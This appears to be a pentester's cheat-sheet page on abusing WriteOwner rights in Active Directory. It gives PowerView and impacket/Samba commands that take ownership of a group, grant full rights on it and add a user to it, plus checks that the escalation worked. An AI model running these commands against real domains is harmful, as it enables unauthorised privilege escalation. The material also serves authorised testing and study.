---
title: "WriteOwner/Own"
date: 2024-7-27
tags: ["WriteOwner", "active driectory", "ad", "Windows", "own"]
---

---
### Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

### Abuse #1 : Change owner of the group (From Windows)

```powershell
Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USERNAME>
```

### Abuse #2 : Add user to the group (From Windows)

#### Authenticated

```powershell
Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity <USERNAME> -Rights All -DomainController <DC>
```

```powershell
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME>
```

#### Runas

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>/<USERNAME>', $password)
```

```powershell
Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USERNAME>' -Rights All -DomainController <DC> -Credential $cred
```

```powershell
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> -Credential $cred
```

#### Check

```powershell
Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
```

```powershell
# Or
net user <USERNAME>
```

```powershell
# Exit current sessions or re-login
whoami /groups
```

### Abuse #2 : Add user to the group (From Linux)

#### 0. Install latest impacket (included dacledit.py)

```bash
git clone https://github.com/fortra/impacket.git
```

```bash
cd impacket
```

```bash
pip3 install .
```

#### 1. Add domain object

```bash
sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC> -principal <USERNAME> -target <TARGET_GROUP> -action write -rights WriteMembers
```

#### 2. Add group member

```bash
kinit <USERNAME>
```

```bash
sudo ntpdate -s <DC> && net rpc group addmem <TARGET_GROUP> <USERNAME> -U <USERNAME> --use-kerberos=required -S <DC> --no-pass
```

#### 3. Check

```bash
sudo ntpdate -s <DC> && net rpc group members <TARGET_GROUP> -U <USERNAME> --use-kerberos=required -S <DC> --no-pass
```

<br>